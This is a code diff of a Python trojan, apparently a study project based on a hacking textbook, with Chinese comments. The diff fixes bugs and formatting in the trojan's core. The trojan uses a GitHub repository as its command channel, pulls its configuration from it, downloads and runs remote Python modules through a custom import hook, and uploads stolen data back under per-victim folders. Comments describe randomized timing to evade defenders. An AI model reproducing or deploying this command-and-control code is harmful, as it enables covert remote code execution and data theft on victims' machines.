@@ -7,9 +7,9 @@ import random
 import sys
 import threading
 
-
 # 为当前的受害者机器实例随机生成一个唯一识别ID
 trojan_id = f"victim_{random.randint(1000, 9999)}"
+
 
 def github_connect():
     try:
@@ -19,7 +19,6 @@ def github_connect():
         print(f"[-] 本地未找到token.txt，输入正确位置..")
         sys.exit(1)
 
-
     user = 'TaMoon1'
     repo_name = 'BHP-Trojan-Project'
 
@@ -28,11 +27,12 @@ def github_connect():
     # 【修复】：原代码使用 sess.repositories 返回的是生成器，应使用 sess.repository 获取具体仓库对象
     return sess.repository(user, repo_name)
 
+
 '''
     =======官方代码如下=======
 def get_file_content(dirname,module_name,repo):
     return repo.file_contents(f"{dirname}/{module_name}").content
-    
+
 class Trojan:
     def get_config(self):
         config_json = get_file_content(
@@ -45,19 +45,20 @@ class Trojan:
     所以这里改成get_file_content()先进行处理
 '''
 
-def get_file_contents(repo,filepath):
+
+def get_file_contents(repo, filepath):
     try:
         contents = repo.file_contents(filepath)
         return base64.b64decode(contents.content)
 
     except Exception as e:
         print(f"读取{filepath}/文件错误:{e}")
-        return None # 【修复】：增加返回None，防止后续调用崩溃
+        return None  # 【修复】：增加返回None，防止后续调用崩溃
 
 
 def get_trojan_config(repo):
     # 远程获取配置文件
-    config_json = get_file_contents(repo,"config/abc.json")
+    config_json = get_file_contents(repo, "config/abc.json")
     if config_json:
         return json.loads(config_json.decode('utf-8'))
 
@@ -65,7 +66,7 @@ def get_trojan_config(repo):
         return []
 
 
-def store_module_result(repo,module_name,data):
+def store_module_result(repo, module_name, data):
     """将窃取到的数据伪装并上传回 GitHub 的 data 目录下"""
     # 模拟生成一个随机的文件名，防止防御人员轻易察觉规律
     remote_path = f"data/{trojan_id}/{module_name}_{int(time.time())}.txt"
@@ -82,6 +83,7 @@ def store_module_result(repo,module_name,data):
 
     print(f"[*]成功将数据传回远程端...")
 
+
 class GitImporter:
     """
     【核心黑客技巧】自定义包导入器
@@ -96,7 +98,7 @@ class GitImporter:
         print(f"[*] 拦截到导入请求，正在检索远程模块: {fullname}")
 
         # 去 GitHub 的 modules 目录下寻找对应的 Python 源码
-        code = get_file_contents(self.repo, f"models/{fullname}.py")
+        code = get_file_contents(self.repo, f"modules/{fullname}.py")
         if code:
             self.current_module_code = code
             return self  # 返回自身作为加载器
@@ -113,7 +115,7 @@ class GitImporter:
         return new_module
 
 
-def module_runner(repo,module_name):
+def module_runner(repo, module_name):
     """多线程调用：负责执行具体的功能模块并回传数据"""
     try:
         # 这里会触发 sys.meta_path 中的 GitImporter 远程下载并加载模块
@@ -123,7 +125,7 @@ def module_runner(repo,module_name):
         result = module.run()
 
         # 上传结果
-        store_module_result(repo,module_name,str(result)) # 确保结果是字符串
+        store_module_result(repo, module_name, str(result))  # 确保结果是字符串
 
     except Exception as e:
         print(f"[-] 模块 {module_name} 执行失败: {e}")
@@ -147,7 +149,7 @@ def main():
             # 【修复】：target 传入的是函数引用，args 传入参数元组，去掉了末尾的 ()
             t = threading.Thread(target=module_runner, args=(repo, target_module))
             t.start()
-            time.sleep(random.randint(1,3))
+            time.sleep(random.randint(1, 3))
 
         # 休眠一段时间（心跳周期），模拟正常流量避开检测
         print("[*] 任务触发完毕，进入下一轮心跳休眠期...")
